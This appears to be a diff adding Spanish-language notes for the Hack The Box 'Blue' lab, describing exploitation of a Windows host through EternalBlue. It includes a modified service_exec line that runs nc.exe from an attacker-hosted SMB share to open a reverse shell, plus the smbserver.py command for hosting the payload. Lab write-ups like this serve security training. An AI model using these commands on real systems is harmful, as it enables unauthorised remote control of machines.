@@ -1,0 +1,36 @@
+maquina blue Htb ---------------- Windows 
+
+Penetration Tester Level 1
+Network
+Vulnerability Assessment
+Protocols
+Outdated Software
+Security Tools
+Metasploit
+SMB
+Reconnaissance
+Remote Code Execution
+
+---------------------------------------------
+
+
+para esta maquina podemos ver que con el eternalblue podemos explotarlo, solo tenemos que 
+utilizar el exploit de checker.py para ver que se puede hacer
+
+tenemos que cambiar el nombre de usuario por "guest" para poder usar el exploit, 
+
+recuerda cambiar la linea de ejecucion ya que por defecto solo nos introduce archivos 
+
+service_exec(conn, r'cmd /c \\10.10.14.25\blue\nc.exe -e cmd 10.10.14.25 443')
+
+esa linea lo que hace es conectarse a un recurso compartido que tienes que tener previamente 
+preparado con el archivo nc.exe (lo tienes en esta carpeta) tambien tienes que tener preparado 
+una consola con un puerto de escucha (en este caso hemos utilizado el 443) 
+
+lo que hace la linea es que primeramente se conecta al recurso compartido que tienes montado 
+con el comando 
+
+smbserver.py "nombredelrecurso" $(pwd)< ----  le indica que quieres que se use desde esa carpeta actual
+
+una vez que tienes las 3 consolas activas y lanzas el exploit podemos ver que se ha conectado y tienes
+una consola interactiva de window
